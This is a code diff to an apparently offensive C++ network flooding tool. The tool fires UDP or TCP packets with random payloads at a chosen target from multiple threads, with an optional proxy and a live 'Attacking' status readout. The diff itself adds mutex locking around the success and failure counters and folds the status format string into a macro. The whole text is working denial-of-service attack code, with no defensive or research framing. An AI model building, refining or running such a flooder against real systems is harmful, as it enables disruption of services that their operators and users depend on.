@@ -20,6 +20,9 @@
              " --debug|-D                 toggle debug printing\n"                                                                          \
              " --proxy|-p     <proxy>     proxy address (not working)" COLOR_RESET "\n"
 
+#define REPORT_FMT COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA \
+        "%s" COLOR_RESET " | sent " COLOR_GREEN "%d" COLOR_RESET " | failed " COLOR_RED "%d" COLOR_RESET " | running threads %d\n"
+
 
 static const char* appname;
 static const char* send_data = nullptr;
@@ -31,6 +34,7 @@ static std::string method;
 static bool debug = false;
 static net::inet_address* target_address = nullptr;
 static net::inet_address* proxy_address = nullptr;
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
 static constexpr const char* s_options = "m:t:T:a:d:Dp:";
 const option l_options[]{
@@ -64,22 +68,28 @@ void* flood_thread(void*)
 		{
 			method = "UDP";
 			net::udp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
+			::pthread_mutex_lock(&mutex);
 			if (flood)
 				++sent_requests;
 			else
 				++failed_requests;
+			::pthread_mutex_unlock(&mutex);
 		}
 		else // tcp
 		{
 			method = "TCP";
 			net::tcp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
+			::pthread_mutex_lock(&mutex);
 			if (flood)
 				++sent_requests;
 			else
 				++failed_requests;
+			::pthread_mutex_unlock(&mutex);
 		}
 	}
+	::pthread_mutex_lock(&mutex);
 	--running_threads;
+	::pthread_mutex_unlock(&mutex);
 	return nullptr;
 }
 
@@ -208,16 +218,14 @@ int main(int argc, char** argv)
 		while (running_threads > 0)
 		{
 			::printf(
-					COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA
-					"%s" COLOR_RESET " | successes " COLOR_GREEN "%d" COLOR_RESET " | fails " COLOR_RED "%d" COLOR_RESET " | running threads %d\n",
+					REPORT_FMT,
 					target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
 			);
 			::sleep(1);
 			::srandom(::clock());
 		}
 		::printf(
-				COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA
-				"%s" COLOR_RESET " | successes " COLOR_GREEN "%d" COLOR_RESET " | fails " COLOR_RED "%d" COLOR_RESET " | running threads %d\n",
+				REPORT_FMT,
 				target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
 		);
 		::exit(0);
